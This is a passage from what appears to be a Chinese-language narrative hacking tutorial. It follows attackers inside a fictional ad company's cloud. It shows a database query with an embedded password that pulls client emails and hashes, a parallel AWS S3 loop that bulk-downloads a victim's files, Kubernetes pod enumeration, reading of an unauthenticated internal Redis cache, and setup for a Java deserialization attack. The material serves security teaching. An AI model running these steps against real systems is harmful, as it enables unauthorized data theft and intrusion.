
```
shell> mysql -h $DBSERVER -u api-core-rw -pz05jLWlgrG7AS6l campaigns -e\
"select ee.name, pp.email, pp.hash, ii.creative, ii.counter, ii.max_budget\
from insertions ii\
inner join entity ee on ee.id= ii.id_entity\
inner join profile pp on pp.id_entity= ii.id_entity\
where ee.name like "%gretsch%""
```

---
Name : Gretsch Politico
Email: eloise.stinson@gretschpolitico.com
Hash: c22fe077aaccbc64115ca137fc3a9dcf
Creative: s4d.mxrads.com/43ed90147211803d546734ea2d0cb/12adad49658582436/vid/720/88b4ab3d165c1cf2.mp4
Counter: 16879
Max_budget: 250000
---
--snip--

看起来 GP 的客户在当前运行的每一条 200 条广告上都花费了数十万美元。这可真是不少钱。

我们遍历数据库中找到的所有创意 URL 并从 S3 中检索它们。

还记得黑客需要精心设计数据外泄工具和技术来绕过数据防泄漏措施，并 painstakingly 从公司网络中提取数据的时候吗？是的，我们现在不需要那样做了。

云服务提供商不在乎你在哪里。只要你有正确的凭证，你就可以下载任何你想要的东西。目标很可能会在月底收到一笔高昂的账单，但这几乎不会引起会计部门任何人的注意。MXR Ads anyway 不断在全球范围内投放这些视频。我们只是一次性下载所有内容。

鉴于涉及的创意数量（属于 GP 的几百个），我们将利用一些 `xargs` 技巧来并行化对 `get-object` API 的调用。我们准备一个包含要获取的创意列表的文件，然后遍历每一行并将其提供给 `xargs`：

```
root@Point1:~/creatives# cat list_creatives.txt | \
xargs -I @ aws s3api get-object \
-P 16 \
--bucket s4d.mxrads.com \
--key @ \
$RANDOM
```

`-I` 标志是替换标记，用于确定要插入读取行的位置。`xargs` 中的 `-P` 标志是并发进程的最大数量（我的机器上为 16）。最后，`RANDOM` 是 `bash` 的默认变量，每次求值都会返回一个随机数，并将作为下载的创意的本地名称。让我们看看我们抓到了多少个创意：

```
root@Point1:~/creatives# ls -l |wc -l
264
```

我们获得了 264 个创意——那是 264 条仇恨信息、Photoshop 图像、伪造视频以及精心剪辑的强调两极化信息的片段。一些图像甚至劝阻人们投票。很明显，为了获得期望的选举结果，什么都不在界限之外。

在获取这些视频文件后，我们成功完成了第 4 章中的第 3 个目标。我们仍有两个关键目标需要完成：揭开 GP 客户的真实身份以及了解数据画像活动的程度。

我们回到 S3 存储桶列表，希望能找到一些机器学习或画像技术（Hadoop、Spark、Flink、Yarn、BigQuery、Jupyter 等）的线索或引用，但没有找到任何有意义且可访问的内容。

### 换个交付链中的另一个组件

我们列出 `prod` 命名空间中运行的所有 Pod 以寻找灵感：

```
shell> ./kubectl get pods -n prod -o="custom-columns=\
NODE:.spec.nodeName,\
POD:.metadata.name"
```

| 节点 | Pod |
|---|---|
| ip-192-168-133-105.eu-... | vast-check-deployment-d34c-7qxm |
| ip-192-168-21-116.eu-... | ads-rtb-deployment-13fe-3evx |
| ip-192-168-86-120.eu-... | iab-depl-69dc-0vslf |
| ip-192-168-38-101.eu-... | cpm-factor-depl-3dbc-3qozx |
| --snip-- |  |

这些 Pod 名称晦涩得令人难以置信。广告业务与华尔街类似，有一种恶习就是躲在晦涩的缩写后面，制造怀疑和混乱。因此，在花了几个小时在维基百科上研究破译这些名称后，我们决定专注于 `ads-rtb` 应用。RTB 代表实时竞价，是一种用于进行拍卖的协议，该拍卖决定在网站上显示特定广告而非其他广告。

每当用户在与 MXR Ads 合作的网站上加载页面时，一段 JavaScript 代码会触发对 MXR Ads 供给方平台（SSP）的调用以运行拍卖。MXR Ads 的 SSP 将请求转发给其他 SSP、广告代理或品牌以收集他们的出价。每个代理作为需求方平台（DSP）出价一定金额以展示其选择的广告。他们愿意出价的金额通常基于多个标准：网站的 URL、页面上广告的位置、页面中的关键词，以及最重要的是用户的数据。如果这些标准适合投放广告的客户，他们就会出价更高。这场拍卖使用 RTB 协议自动进行。

RTB Pod 可能无法访问个人数据，只是盲目地将请求中继到由 GP 主办的服务器，但鉴于 RTB 协议在广告投放中的核心地位，这些 Pod 很可能将引领我们找到下一个目标。

## Redis 与实时竞价

我们提取 `ads-rtb` 的 Pod 清单：

```
spec:
  containers:
    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/ads-rtb
--snip--
    - image: 886371554408.dkr.ecr.eu-west-1.amazonaws.com/redis-rtb
      name: rtb-cache-mem
      ports:
        - containerPort: 6379
          protocol: TCP
  nodeName: ip-192-168-21-116.eu-west-1.compute.internal
  hostIP: 192.168.21.116
  podIP: 10.59.12.47
```

看这个！一个 Redis 容器与 RTB 应用一起运行，监听 `6379` 端口。

如前所述，我还没有见过在内部网络中用身份验证保护的 Redis 数据库，所以你可以想象，我们隐藏在 Kubernetes 集群 Pod 内的 Redis 显然张开双臂欢迎我们。我们下载 Redis 客户端并继续列出数据库中保存的键：

```
shell> apt install redis-tools

shell> redis -h 10.59.12.47 --scan * > all_redis_keys.txt

shell> head -100 all_redis_keys.txt
vast_c88b4ab3d_19devear
select_3799ec543582b38c
vast_5d3d7ab8d4
--snip--
```

每个 RTB 应用都附带一个自己的 Redis 容器，作为本地缓存存储各种对象。键 `select_3799ec543582b38c` 包含一个序列化为字节的 Java 对象字面量。我们可以确定这一点，因为任何 Java 序列化对象都有十六进制字符串标记 `00 05 73 72`，当我们查询该键的值时可以看到它：

```
shell> redis -h 10.59.12.47 get select_3799ec543582b38c

AAVzcgA6Y29tLm14cmFkcySydGIuUmVzdWx0U2VOJEJpZFJ1cXVlc3SzvY…
```

```
shell> echo -ne AAVzcgA6Y29tLm14cmFkcySydGI...| base64 -d | xxd
aced 0005 7372 003a 636f 6d2e 6d78 7261 ......sr.:com.mxra
6473 2e72 7462 2e52 6573 756c 7453 6574 ds.rtb.ResultSet$B
2442 6964 5265 7175 6573 74b3 bd8d d306 $BidRequest......
091f ef02 003d dd...
```

与其每次都从数据库中重复检索相同的结果并无谓地承担昂贵的网络延迟成本，`ads-rtb` 容器会将之前的数据库结果（字符串、对象等）保存在其本地 Redis 容器缓存中。如果相同的请求稍后再次出现，它几乎可以瞬间从 Redis 中获取相应的结果。

这种缓存形式在最初的应用设计中可能被誉为一个很棒的想法，但它涉及一个危险且经常被忽视的操作：反序列化。
